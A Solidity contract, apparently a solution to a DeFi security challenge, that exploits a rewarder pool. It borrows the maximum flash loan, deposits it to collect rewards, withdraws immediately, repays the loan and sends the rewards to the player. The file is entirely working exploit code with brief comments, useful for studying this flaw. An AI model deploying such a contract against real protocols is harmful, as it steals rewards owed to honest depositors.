// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
//import "solady/src/utils/SafeTransferLib.sol";

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract RewarderAttacker {
    uint private maxFlashLoanAmount;
    address private player;

    IFlashloanPool private flashloanPool;
    IRewarderPool private rewarderPool;

    address private liquidityToken;
    address private rewardToken;

    constructor(address _flashloanPool, address _player, uint _maxFlashLoanAmount, address _rewarderPool, 
        address _liquidityToken, address _rewardToken) {

        flashloanPool = IFlashloanPool(_flashloanPool);
        rewarderPool = IRewarderPool(_rewarderPool);

        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;

        player = _player;
        maxFlashLoanAmount = _maxFlashLoanAmount;
    }
    
    function attack() public {
        //take out the max FL => this triggers the receiveFlashLoan function below
        flashloanPool.flashLoan(maxFlashLoanAmount);

        //check the reward & transfer to player
        uint reward = IERC20(rewardToken).balanceOf(address(this)); 
        IERC20(rewardToken).transfer(player, reward);    
    }

    function receiveFlashLoan(uint256 amount) external payable {
        //we need to allow the rewarder pool to spend our tokens => on deposit()
        IERC20(liquidityToken).approve(address(rewarderPool), amount);
        
        //deposit all tokens => we get the reward
        rewarderPool.deposit(amount);
        //we can immediately withdraw, because we already have our reward
        rewarderPool.withdraw(amount);

        //finally, we need to pay back the FL
        IERC20(liquidityToken).transfer(address(flashloanPool), amount);
        //SafeTransferLib.safeTransfer(liquidityToken, address(flashloanPool), amount);  
    }    
}
